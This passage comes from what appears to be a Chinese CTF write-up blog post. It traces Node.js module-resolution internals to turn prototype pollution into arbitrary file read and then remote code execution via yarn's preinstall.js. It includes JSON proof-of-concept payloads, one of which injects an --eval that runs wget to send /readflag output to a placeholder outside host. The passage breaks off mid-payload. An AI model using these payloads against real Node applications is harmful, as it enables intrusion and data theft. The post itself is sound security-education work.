title="自定义filename"></a>自定义filename</h2><h3 id="Module-resolveFilename-request-parent-isMain"><a href="#Module-resolveFilename-request-parent-isMain" class="headerlink" title="Module._resolveFilename(request, parent, isMain)"></a>Module._resolveFilename(request, parent, isMain)</h3><p>前面几个if语句都没进入且不可控</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parentPath = <span class="title function_">trySelfParentPath</span>(parent);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> selfResolved = <span class="title function_">trySelf</span>(parentPath, request);</span><br></pre></td></tr></table></figure><p>第一个函数依然不可控，<code>parentPath</code>为调用<code>require()</code>函数的地址，进入<code>tryself(parentPath, request)</code></p><h3 id="trySelf-parentPath-request"><a href="#trySelf-parentPath-request" class="headerlink" title="trySelf(parentPath, request)"></a>trySelf(parentPath, request)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trySelf</span>(<span class="params">parentPath, request</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!parentPath) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; <span class="attr">data</span>: pkg, <span class="attr">path</span>: pkgPath &#125; = <span class="title function_">readPackageScope</span>(parentPath) || &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!pkg || pkg.<span class="property">exports</span> === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> pkg.<span class="property">name</span> !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> expansion;</span><br><span class="line">  <span class="keyword">if</span> (request === pkg.<span class="property">name</span>) &#123;</span><br><span class="line">    expansion = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">`<span class="subst">$&#123;pkg.name&#125;</span>/`</span>)) &#123;</span><br><span class="line">    expansion = <span class="string">&#x27;.&#x27;</span> + <span class="title class_">StringPrototypeSlice</span>(request, pkg.<span class="property">name</span>.<span class="property">length</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">      <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">      <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">code</span> === <span class="string">&#x27;ERR_MODULE_NOT_FOUND&#x27;</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="title function_">createEsmNotFoundErr</span>(request, pkgPath + <span class="string">&#x27;/package.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="attr">data</span>: pkg, <span class="attr">path</span>: pkgPath &#125; = <span class="title function_">readPackageScope</span>(parentPath) || &#123;&#125;;</span><br></pre></td></tr></table></figure><p>关注这里的<code>pkg</code>和<code>pkgPath</code>，由<code>readPackgeScope(parentPath)</code>获得，该函数负责从<code>parentPath</code>开始，一直遍历到根目录，查找package.json，如果找到package.json，就从文件中加载变量；否则返回<code>undefined</code>。如果我们能让这里返回<code>undefined</code>，那么给该值赋值就为{}，根据上面的污染，而我们能通过<code>&#123;&#125;</code>的<code>__proto__</code>来控制<code>data</code>和<code>path</code>。</p><p>那么我们能确定<code>readPackageScope(parentPath)</code>返回false吗？能，进入题目docker环境，可以看到Js文件在&#x2F;app下，这两个目录中没有包括package.json（这里有个蛋疼的地方是package.json题目附件给我们了，导致idea调试一直卡在这，后来把package.json删了才能用）。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-6.png"></p><p>所以这里的pkg和pkgPath是可控的值。接下来就是研究控制这两个值如何利用，进而修改filename。</p><h2 id="结合debug调参"><a href="#结合debug调参" class="headerlink" title="结合debug调参"></a>结合debug调参</h2><p>分别进行每一行的调试，找到题目需要赋值的地方。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pkg || pkg.<span class="property">exports</span> === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> pkg.<span class="property">name</span> !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>首先是两个<code>if</code>语句，我们要保证<code>pkg</code>不为空且<code>pkg.exports!=undefined</code>，我们进行赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg = &#123;<span class="string">&quot;exports&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>接着往下，需要对<code>pkg.name</code>赋值字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg.<span class="property">name</span> = <span class="string">&quot;2&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-7.png"></p><p>这样我们就可以过掉两个<code>if</code>语句，看接下来的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (request === pkg.<span class="property">name</span>) &#123;</span><br><span class="line">   expansion = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">`<span class="subst">$&#123;pkg.name&#125;</span>/`</span>)) &#123;</span><br><span class="line">   expansion = <span class="string">&#x27;.&#x27;</span> + <span class="title class_">StringPrototypeSlice</span>(request, pkg.<span class="property">name</span>.<span class="property">length</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里要求①<code>request == pkg.name</code>②<code>StringPrototypeStartsWith(request, `$&#123;pkg.name&#125;/`) != 0</code>，否则返回false，所以我们必须满足两个条件之一。</p><p>这里request的值是固定的”.&#x2F;usage”，所以我们的request有了两种取值的可能</p><ul><li>.&#x2F;usage</li><li>.</li></ul><p>我们先设定<code>pkg.name = &quot;./usage&quot;</code>，那么我们得到的<code>expansion=.</code>。接着向下，进入<code>return</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">   <span class="keyword">if</span> (e.<span class="property">code</span> === <span class="string">&#x27;ERR_MODULE_NOT_FOUND&#x27;</span>)</span><br><span class="line">     <span class="keyword">throw</span> <span class="title function_">createEsmNotFoundErr</span>(request, pkgPath + <span class="string">&#x27;/package.json&#x27;</span>);</span><br><span class="line">   <span class="keyword">throw</span> e;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>return</code>语句较为复杂，先调用了两个<code>pathToFileURL()</code>，作为<code>packageExportsResolve(arg5)</code>的第一个变量和第四个变量传入，返回的值作为<code>finalizeEsmResolution(arg3)</code>的第一个参数传入，最后返回filename。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br></pre></td></tr></table></figure><h3 id="pathToFileURL"><a href="#pathToFileURL" class="headerlink" title="pathToFileURL"></a>pathToFileURL</h3><p>pathToFileURL会返回URL对象，随便给pkgPath赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkgPath = <span class="string">&quot;/xxxpath&quot;</span></span><br></pre></td></tr></table></figure><p>分别查看返回的两个对象：</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-11.png"></p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-9.png"></p><p>可以看到第一个参数由于我们传入的<code>pkgPath</code>为<code>xxxpath</code>，这个取值我们根据后面再调整；第二个参数是调用<code>require()</code>的参数路径。</p><h3 id="packageExportsResolve"><a href="#packageExportsResolve" class="headerlink" title="packageExportsResolve"></a>packageExportsResolve</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">packageExportsResolve</span>(<span class="params"></span></span><br><span class="line"><span class="params">  packageJSONUrl, packageSubpath, packageConfig, base, conditions</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="built_in">exports</span> = packageConfig.<span class="property">exports</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isConditionalExportsMainSugar</span>(<span class="built_in">exports</span>, packageJSONUrl, base))</span><br><span class="line">    <span class="built_in">exports</span> = &#123; <span class="string">&#x27;.&#x27;</span>: <span class="built_in">exports</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">ObjectPrototypeHasOwnProperty</span>(<span class="built_in">exports</span>, packageSubpath) &amp;&amp;</span><br><span class="line">      !<span class="title class_">StringPrototypeIncludes</span>(packageSubpath, <span class="string">&#x27;*&#x27;</span>) &amp;&amp;</span><br><span class="line">      !<span class="title class_">StringPrototypeEndsWith</span>(packageSubpath, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> target = <span class="built_in">exports</span>[packageSubpath];</span><br><span class="line">    <span class="keyword">const</span> resolveResult = <span class="title function_">resolvePackageTarget</span>(</span><br><span class="line">      packageJSONUrl, target, <span class="string">&#x27;&#x27;</span>, packageSubpath, base, <span class="literal">false</span>, <span class="literal">false</span>, conditions</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resolveResult == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="title function_">throwExportsNotFound</span>(packageSubpath, packageJSONUrl, base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resolveResult;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过调试可以看到这个对<code>exports</code>赋值<code>&#123;&#39;.&#39;: exports&#125;</code>，然后这个由于<code>exports=packageSubpath</code>，这个<code>if</code>语句是一定会进入的，我们接下来会获得<code>target = exports[packageSubpath];</code></p><p>这里我们赋值为字符串，所以会进入第一个if语句，如果将exports赋值为{‘.’: ‘xxxx’}，则可以不进入if语句，两者等效。</p><p>接着进入<code>resolvePackageTarget</code>。</p><h3 id="resolvePackageTarget"><a href="#resolvePackageTarget" class="headerlink" title="resolvePackageTarget"></a>resolvePackageTarget</h3><p>进入后，由于<code>type</code>为<code>string</code>，进入<code>resolvePackageTargetString</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;./&#x27;</span>)) &#123;</span><br><span class="line">   <span class="keyword">if</span> (internal &amp;&amp; !<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;../&#x27;</span>) &amp;&amp;</span><br><span class="line">       !<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">     <span class="keyword">let</span> isURL = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title function_">URL</span>(target);</span><br><span class="line">       isURL = <span class="literal">true</span>;</span><br><span class="line">     &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">       <span class="comment">// Continue regardless of error.</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!isURL) &#123;</span><br><span class="line">       <span class="keyword">const</span> exportTarget = pattern ?</span><br><span class="line">         <span class="title class_">RegExpPrototypeSymbolReplace</span>(patternRegEx, target, <span class="function">() =&gt;</span> subpath) :</span><br><span class="line">         target + subpath;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">packageResolve</span>(</span><br><span class="line">         exportTarget, packageJSONUrl, conditions);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_">throwInvalidPackageTarget</span>(match, target, packageJSONUrl, internal, base);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里会对<code>target</code>是否以<code>./</code>开头进行判断，我们将其值改为<code>./111</code>同样可以进入，最后到new URL语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> resolved = <span class="keyword">new</span> <span class="title function_">URL</span>(target, packageJSONUrl); </span><br></pre></td></tr></table></figure><h3 id="再次回到URL"><a href="#再次回到URL" class="headerlink" title="再次回到URL"></a>再次回到URL</h3><p>这里我们传入的两个值分别是<code>./111</code>， 以及我们刚开始传入的第一个变量即包含了<code>undefined</code>的那条URL类路径，而这两个值，都是可控的。最后该函数将<code>./111</code>代替了URL的最后一个参数即package.json，形成新的URL。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-10-1024x430.png"></p><p>于是到这里，我们就完成了移花接木，将我们设置的路径和文件名全部写了进去，最后返回为<code>filename</code>给loader，实现任意文件读取</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-12-1024x182.png"></p><p>POC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./11111&quot;</span> <span class="comment">// 读取的文件名</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/xxxxpath&quot;</span><span class="punctuation">,</span> <span class="comment">// 文件路径</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./11111&quot;</span> <span class="comment">// 读取的文件名</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/xxxxpath&quot;</span><span class="punctuation">,</span> <span class="comment">// 文件路径</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="…如何触发catch"><a href="#…如何触发catch" class="headerlink" title="…如何触发catch?"></a>…如何触发catch?</h2><p>由于我们需要污染全部的json参数，所以我们要正常调用require(‘index’){O, o}，最后的污染可以通过catch来触发，调用require(‘.&#x2F;usage’)。当json数据不正常时，无法被当作正常的数组进行遍历，可以触发catch。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>docker里的js文件数量还是非常惊人的</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-13-1024x427.png"></p><p>关于这里如何提取到关键的js我也没主意，我觉得是通过全局搜索关键字搜出来或者是本来就这个文件是敏感文件的吧，大哥们带带，总之是确定了&#x2F;opt&#x2F;yarn-v1.22.19&#x2F;preinstall.js是可以利用的文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file is a bit weird, so let me explain with some context: we&#x27;re working</span></span><br><span class="line"><span class="comment">// to implement a tool called &quot;Corepack&quot; in Node. This tool will allow us to</span></span><br><span class="line"><span class="comment">// provide a Yarn shim to everyone using Node, meaning that they won&#x27;t need to</span></span><br><span class="line"><span class="comment">// run `npm install -g yarn`.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Still, we don&#x27;t want to break the experience of people that already use `npm</span></span><br><span class="line"><span class="comment">// install -g yarn`! And one annoying thing with npm is that they install their</span></span><br><span class="line"><span class="comment">// binaries directly inside the Node bin/ folder. And Because of this, they</span></span><br><span class="line"><span class="comment">// refuse to overwrite binaries when they detect they don&#x27;t belong to npm. Which</span></span><br><span class="line"><span class="comment">// means that, since the &quot;yarn&quot; Corepack symlink belongs to Corepack and not npm,</span></span><br><span class="line"><span class="comment">// running `npm install -g yarn` would crash by refusing to override the binary :/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// And thus we have this preinstall script, which checks whether Yarn is being</span></span><br><span class="line"><span class="comment">// installed as a global binary, and remove the existing symlink if it detects</span></span><br><span class="line"><span class="comment">// it belongs to Corepack. Since preinstall scripts run, in npm, before the global</span></span><br><span class="line"><span class="comment">// symlink is created, we bypass this way the ownership check.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// More info:</span></span><br><span class="line"><span class="comment">// https://github.com/arcanis/pmm/issues/6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">npm_config_global</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> targetPath = cp.<span class="title function_">execFileSync</span>(process.<span class="property">execPath</span>, [process.<span class="property">env</span>.<span class="property">npm_execpath</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>], &#123;</span><br><span class="line">            <span class="attr">encoding</span>: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">            <span class="attr">stdio</span>: [<span class="string">&#x27;ignore&#x27;</span>, <span class="literal">undefined</span>, <span class="string">&#x27;ignore&#x27;</span>],</span><br><span class="line">        &#125;).<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> manifest = <span class="built_in">require</span>(<span class="string">&#x27;./package.json&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> binNames = <span class="keyword">typeof</span> manifest.<span class="property">bin</span> === <span class="string">&#x27;string&#x27;</span></span><br><span class="line">            ? [manifest.<span class="property">name</span>.<span class="title function_">replace</span>(<span class="regexp">/^@[^\/]+\//</span>, <span class="string">&#x27;&#x27;</span>)]</span><br><span class="line">            : <span class="keyword">typeof</span> manifest.<span class="property">bin</span> === <span class="string">&#x27;object&#x27;</span> &amp;&amp; manifest.<span class="property">bin</span> !== <span class="literal">null</span></span><br><span class="line">                ? <span class="title class_">Object</span>.<span class="title function_">keys</span>(manifest.<span class="property">bin</span>)</span><br><span class="line">                : [];</span><br><span class="line"></span><br><span class="line">        binNames.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">binName</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> binPath = path.<span class="title function_">join</span>(targetPath, binName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> binTarget;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                binTarget = fs.<span class="title function_">readlinkSync</span>(binPath);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (binTarget.<span class="title function_">startsWith</span>(<span class="string">&#x27;../lib/node_modules/corepack/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.<span class="title function_">unlinkSync</span>(binPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="comment">// ignore errors</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的if语句检查了process.env.npm_config_global，默认为undefined，可以通过原型链污染对其赋值；分别包含了命令执行文件读取的包，然后调用child_process.execFileSync，该函数同步创建进程调用shell，其中第一个参数不可控，为node的二进制文件，第二个参数同样也是process.env的process.env.npm_execpath，依然可控，同时由于node支持-eval来执行javascript命令，可以使用-eval来执行javascript指令。</p><p>POC:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_config_global&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_execpath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--eval=require(&#x27;child_process&#x27;).execSync(&#x27;wget$&#123;IFS&#125;https://xxx/`/readflag`&#x27;)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span 